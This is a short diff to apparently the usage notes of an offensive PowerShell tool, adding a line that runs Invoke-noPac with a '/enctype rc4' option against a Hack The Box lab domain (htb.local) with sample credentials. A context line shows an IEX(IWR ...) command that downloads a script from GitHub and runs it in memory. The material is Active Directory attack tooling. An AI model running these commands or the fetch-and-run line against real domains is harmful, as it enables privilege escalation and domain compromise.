@@ -20,4 +20,5 @@ IEX(IWR -UseBasicParsing -UserAgent "hi-there-blueteam" 'https://raw.githubuserc
 
 Invoke-noPac
 Invoke-noPac -Command "scan -domain htb.local -user domain_user -pass 'Password123!'"
+Invoke-noPac -Command "scan -domain htb.local -user domain_user -pass 'Password123!' /enctype rc4"
 ```
